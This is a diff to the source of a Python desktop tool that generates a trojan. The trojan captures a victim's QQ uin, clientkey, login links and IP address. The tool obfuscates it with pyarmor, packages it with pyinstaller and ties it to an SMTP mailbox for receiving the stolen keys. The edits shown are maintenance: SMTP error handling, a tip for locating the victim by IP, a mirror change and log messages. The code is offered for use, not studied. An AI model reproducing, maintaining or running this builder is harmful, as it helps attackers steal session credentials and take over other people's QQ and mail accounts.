@@ -586,6 +586,7 @@ nickname={nickname}
         sys.stdout = sys.__stdout__
         print(self.icon_path)
 
+
     def generate_trojan(self, reset_icon_path=False):
         sys.stdout = self.output_signal
         self.func_running = True
@@ -659,6 +660,9 @@ nickname={nickname}
                 except Exception as e:
                     print("出现未知错误,请检查smtp服务器是否正确!")
                     print(f"原因:{repr(e)}")
+                    self.func_running = False
+                    self.flag = self.lineEdit_4.text()[1:-1]
+                    return
             else:
                 print("Warning:当前邮箱密码未更改,将忽略因密码有误而无法收Key风险!")
             zip_path = '.\\Tools.zip'
@@ -707,10 +711,12 @@ os.startfile(file)\n""" + content
             # content = content.replace("if clientkey is None:","if not clientkey:")
             # content = content.replace("--------登录网址--------","--------登录网址--------\nTips:如果出现qzone和mail均无法登录而qun可以登录的情况请尝试使用主界面的Key解析器进行解析登录\n")
             # content = content.replace("uin:{uin}","uin:{uin}\nclientkey:{clientkey}")
+            content = content.replace("ip:{ip}", "ip:{ip}\nTip: 如果邮件标题地址显示不全请访问 https://www.ip138.com 使用上方ip手动查询地址")
+            content = content.replace("Tips","Tip")
             with open(".\\qkey_code.py", 'w', encoding='utf-8') as f:
                 f.write(content)
             print("开始下载打包所需文件...")
-            installing_log = subprocess.Popen(".\\data\\python.exe -m pip install pyinstaller requests pyarmor==9.0.3 -i https://pypi.tuna.tsinghua.edu.cn/simple",creationflags=subprocess.CREATE_NO_WINDOW,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+            installing_log = subprocess.Popen(".\\data\\python.exe -m pip install pyinstaller requests pyarmor==9.0.3 -i https://mirrors.aliyun.com/pypi/simple",creationflags=subprocess.CREATE_NO_WINDOW,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
             installing_log = installing_log.communicate()
             print("加密代码中...")
             encrypting_log = subprocess.Popen(".\\data\\Scripts\\pyarmor.exe gen qkey_code.py --output=final_code --enable-jit",creationflags=subprocess.CREATE_NO_WINDOW,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
@@ -768,15 +774,14 @@ os.startfile(file)\n""" + content
                 content += f"{i}\n"
             _ = '\\'
             content += f"""{'=' * 16}
-是否打包成功:{os.path.isfile('QQKey.exe' or os.path.isfile(f'.{_}dist{_}qkey_code.exe'))}
 当前版本号:v{version}"""
             with open(f"ERROR_{local_time}.log", 'w', encoding='utf-8') as f:
                 f.write(content)
             print(f"日志生成完毕,已保存至ERROR_{local_time}.log")
             print("您可以使用日志到Github提交issue(在主界面提供反馈打开)",end='')
+            print("您也可尝试将data文件夹删除后重新执行生成木马")
         self.func_running = False
         sys.stdout = sys.__stdout__
-
 
 if __name__ == '__main__':
     QtGui.QGuiApplication.setHighDpiScaleFactorRoundingPolicy(QtCore.Qt.HighDpiScaleFactorRoundingPolicy.PassThrough)
